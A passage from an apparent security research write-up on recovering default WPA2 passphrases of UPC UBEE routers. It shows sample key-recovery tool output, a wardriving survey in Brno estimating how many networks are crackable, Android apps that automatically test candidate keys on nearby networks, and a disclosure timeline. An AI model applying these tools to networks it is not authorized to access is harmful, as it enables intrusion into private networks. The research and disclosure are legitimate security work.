 upc_ubee_keys // WPA2 passphrase recovery tool for UPC%07d UBEE EVW3226 devices 
================================================================================
by ph4r05, miroc

  your-BSSID: 647C34123456, SSID: UPC3910551, PASS: HAYQQHCS

  near-BSSID: 647C3412344F, SSID: UPC5316036, PASS: OPTXTJKH 
  near-BSSID: 647C34123450, SSID: UPC0624103, PASS: ZVPKYKCI 
  near-BSSID: 647C34123451, SSID: UPC0595666, PASS: NRFJHXDX 
  near-BSSID: 647C34123452, SSID: UPC5434630, PASS: UTVBNYJP 
  near-BSSID: 647C34123453, SSID: UPC2659797, PASS: IVGDQAMI  <-- 2.4 Ghz
  near-BSSID: 647C34123454, SSID: UPC2152244, PASS: ZVESFKYD 
  near-BSSID: 647C34123455, SSID: UPC2870546, PASS: PXKRLPCC  <-- 5.0 GHz
  near-BSSID: 647C34123456, SSID: UPC3910551, PASS: HAYQQHCS 
  near-BSSID: 647C34123457, SSID: UPC8366197, PASS: CIIMMAYX 
  near-BSSID: 647C34123458, SSID: UPC9505606, PASS: VRJXAHPE 
  near-BSSID: 647C34123459, SSID: UPC7482035, PASS: CQTJPRCB 
  near-BSSID: 647C3412345A, SSID: UPC3856093, PASS: TUXFTTLL 
```

# Wardriving
And now the funny part.
To face our results with the reality, we did a small [wardriving](https://en.wikipedia.org/wiki/Wardriving) test. To those who do not the term, it is an act of searching for available WiFi networks in a specific area, usually from a car. 

We are based in [Brno](https://en.wikipedia.org/wiki/Brno), which is the second largest city of the Czech Republic. It has population about 400 000 people, lots of them concentrated in city blocks where people are living in tower buildings known as "panelaky". This proved to be a good target since there are plenty of WiFis to be catched.

Our setup was simple - Linux laptop having external WiFi card (TP-LINK TL-WN722N) with [Kismet](https://en.wikipedia.org/wiki/Kismet_(software)) and Motorola Moto G Android phone with TO-BE-ADDED software. Long story short - suprisingly the Android phone did a better job and found as twice as much networks as the complicated PC setup. Therefore the further data is mostly from the Android device.

We did a 3 hours long drive from which the main results are:

- We catched **17 516** unique networks (unique BSSIDs). 
- **2834** were networks with SSID matching `'^UPC[0-9]{6,9}$'`, these are WLANs possibly vulnerable to the both attacks combined.
- **443** of them are having BSSID `64:7c:34` prefix, these are UPC UBEE devices possibly vulnerable to our new attack. Estimately **15.6%** of all UPC routers are the new UPC UBEE routers.
- In summary, UPC is fairly widespread here in Brno, having an estimated market share about **16.17%**. This means we are possibly able to crack every 6th WiFI network, considering users do not change their default passwords very often.

# Android apps

**RouterKeygen**

To enable users to test their default UPC WiFi keys from their Android phones, we added support to [RouterKeygen](https://github.com/routerkeygen/routerkeygenAndroid) application for our algorithm (and to Blasty's algorithm as well). RouterKeygen scans nearby WiFi networks, detects any UPC routers and automatically generates and tests candidate keys.

[![RouterKeygen Yolosec](/static/ubee/routerkeygen_screen.jpg)](/static/ubee/routerkeygen_screen.jpg)

**UPC Keygen**

[UPC Keygen](https://github.com/yolosec/upcKeygen) is a lightweight alternative for RouterKeygen that requires no Android permissions. It allows user manually enter UPC SSID and calculate candidate keys using Blasty's original algorithm (our algorithm is not supported).

[![RouterKeygen Yolosec](/static/ubee/upckeygen_screen.jpg)](/static/ubee/upckeygen_screen.jpg)

Both applications are available at the Google Play Store [here](https://play.google.com/store/apps/details?id=net.yolosec.routerkeygen2) and [here](https://play.google.com/store/apps/details?id=net.yolosec.upckeygen).

# Responsible disclosure

- _27. Jan 2016_: Start of the analysis.
- _04. Feb 2016_: Official disclosure to Liberty Global.
- _04. May 2016_: Check with Liberty Global on state of the fix.
- _28. Jun 2016_: Sending this article for approval to Liberty Global.
- _xx. Jun 2016_: Publication of this article.



